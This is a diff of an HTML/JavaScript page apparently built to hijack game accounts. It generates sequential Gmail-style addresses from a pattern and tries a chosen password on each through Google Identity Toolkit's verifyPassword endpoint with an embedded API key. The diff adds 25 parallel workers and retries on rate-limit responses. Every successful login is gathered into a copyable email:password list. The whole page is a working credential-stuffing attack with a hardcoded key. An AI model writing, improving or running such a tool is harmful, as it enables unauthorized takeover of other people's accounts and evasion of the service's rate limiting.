@@ -1,101 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPM Infinite Fire</title>
+    <title>CPMEGY ABSOLUTE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
-        .box { max-width: 500px; margin: auto; background: #080808; padding: 20px; border: 2px solid #ff0055; border-radius: 15px; box-shadow: 0 0 20px #ff0055; }
-        h2 { color: #ff0055; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #ff0055; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; }
-        .btn-fire { width: 100%; padding: 18px; background: #ff0055; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; box-shadow: 0 0 15px #ff0055; }
-        .stats { display: flex; justify-content: space-around; margin: 20px 0; background: #111; padding: 15px; border-radius: 10px; border: 1px solid #222; }
-        .stats b { font-size: 24px; color: #ff0055; display: block; }
-        #res { width: 100%; height: 250px; background: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 10px; font-family: monospace; font-size: 13px; margin-top: 15px; box-sizing: border-box; }
-        .copy-btn { width: 100%; padding: 12px; background: #222; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; margin-top: 10px; cursor: pointer; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
+        .terminal { max-width: 500px; margin: auto; border: 2px solid #0f0; padding: 20px; background: #050505; box-shadow: 0 0 20px #0f0; border-radius: 10px; }
+        h2 { font-size: 18px; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
+        
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #0f0; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
+        .btn-start { width: 100%; padding: 18px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 15px #0f0; }
+        
+        .stats { display: flex; justify-content: space-around; margin: 20px 0; border: 1px solid #333; padding: 10px; border-radius: 5px; }
+        .stats b { font-size: 22px; color: #fff; }
+
+        #res { width: 100%; height: 250px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; margin-top: 15px; box-sizing: border-box; }
+        .log { font-size: 10px; color: #888; text-align: left; height: 20px; overflow: hidden; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>🔥 INFINITE FIRE</h2>
-    <input type="text" id="fmt" placeholder="Format: cpm_{4}_@gmail.com">
+<div class="terminal">
+    <h2>[ ABSOLUTE RECOVERY V4 ]</h2>
+    
+    <input type="text" id="fmt" placeholder="Format: player_{4}_@gmail.com">
     <input type="text" id="pwd" placeholder="Password to check">
     
-    <button class="btn-fire" id="btn" onclick="ignite()">⚡ START INFINITE SCAN</button>
+    <button class="btn-start" id="btn" onclick="startAbsolute()">▶ IGNITE NO-SKIP SCAN</button>
 
     <div class="stats">
-        <div>CHECKED<b id="c">0</b></div>
-        <div>FOUND<b id="f" style="color:#00ff00">0</b></div>
+        <div>CHECKED<br><b id="c">0</b></div>
+        <div>FOUND<br><b id="f">0</b></div>
     </div>
 
-    <textarea id="res" readonly placeholder="Hits: Email:Pass"></textarea>
-    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL EMAIL:PASS</button>
+    <div class="log" id="log">Status: Idle</div>
+    <textarea id="res" readonly placeholder="Result: Email:Pass"></textarea>
+    
+    <button onclick="copyResults()" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0; padding:10px; margin-top:10px; cursor:pointer;">[ COPY ALL HITS ]</button>
 </div>
 
 <script>
     let active = false;
     let checked = 0;
     let found = 0;
+    let currentIndex = 0;
 
-    async function ignite() {
+    async function startAbsolute() {
         if (active) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("Fill data!");
+        if (!fmt.includes('{') || !pwd) return alert("Fill Format and Password!");
 
         active = true;
-        document.getElementById('btn').innerText = "🛑 STOP / RELOAD";
+        document.getElementById('btn').innerText = "■ EMERGENCY STOP";
+        document.getElementById('btn').style.background = "#f00";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- EXTREME INDIVIDUAL REQUEST LOGIC ---
-        // ഓരോ നമ്പറിനും ഓരോ സെപ്പറേറ്റ് റിക്വസ്റ്റ് ഒരേസമയം അയക്കുന്നു
-        for (let i = 0; i < max; i++) {
-            if (!active) break;
+        // --- EXTREME CONCURRENCY WITHOUT SKIPPING ---
+        // ഒരേസമയം 25 പാരലൽ വർക്കേഴ്സ് റൺ ചെയ്യും. 
+        // ഒരു വർക്കർ ഒരു റിക്വസ്റ്റ് കംപ്ലീറ്റ് ചെയ്താലുടൻ അടുത്ത നമ്പറിലേക്ക് പോകും.
+        let workers = 25; 
 
-            let num = i.toString().padStart(digits, '0');
+        for (let i = 0; i < workers; i++) {
+            workerEngine(fmt, pwd, key, digits, max);
+        }
+    }
+
+    async function workerEngine(fmt, pwd, key, digits, max) {
+        while (active && currentIndex < max) {
+            let id = currentIndex++;
+            let num = id.toString().padStart(digits, '0');
             let email = fmt.replace(/\{(\d+)\}/, num);
             
-            // "await" ഉപയോഗിക്കുന്നില്ല, അതുകൊണ്ട് ഓരോന്നും സ്വന്തമായി വർക്ക് ചെയ്യും
-            checkAcc(email, pwd, key);
+            document.getElementById('log').innerText = "Testing: " + email;
 
-            // ബ്രൗസർ ക്രാഷ് ആവാതിരിക്കാൻ ഓരോ 100 റിക്വസ്റ്റ് കഴിഞ്ഞും ചെറിയൊരു ബ്രീത്തിങ് ടൈം
-            if (i % 100 === 0) {
-                await new Promise(r => setTimeout(r, 50));
-                document.getElementById('c').innerText = i;
+            let status = await check(email, pwd, key);
+
+            if (status === "RETRY") {
+                currentIndex--; // ബ്ലോക്ക് ആയാൽ ആ നമ്പർ വിട്ടുപോകാതെ വീണ്ടും ഇൻഡക്സിൽ ചേർക്കുന്നു
+                await new Promise(r => setTimeout(r, 2000)); // ഗ്യാപ്പ് നൽകി റീ-ട്രൈ ചെയ്യുന്നു
+            } else {
+                checked++;
+                document.getElementById('c').innerText = checked;
             }
         }
     }
 
-    async function checkAcc(em, pw, k) {
+    async function check(em, pw, k) {
         try {
             let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                 method: 'POST',
                 body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                 headers: { 'Content-Type': 'application/json' }
             });
-            let d = await r.json();
             
-            checked++; 
-            if (checked % 10 === 0) document.getElementById('c').innerText = checked;
+            if (r.status === 429) return "RETRY"; // Rate Limited
 
+            let d = await r.json();
             if (d && d.idToken) {
                 found++;
                 document.getElementById('f').innerText = found;
                 document.getElementById('res').value += em + ":" + pw + "\n";
                 document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
             }
+            return "OK";
         } catch (e) {
-            // Error വന്നാൽ ആ അക്കൗണ്ട് വിട്ടുപോകാതിരിക്കാൻ വീണ്ടും ട്രൈ ചെയ്യാം
+            return "RETRY"; // Connection Error
         }
     }
 
-    function copyHits() {
+    function copyResults() {
         let t = document.getElementById('res');
         t.select();
         document.execCommand('copy');
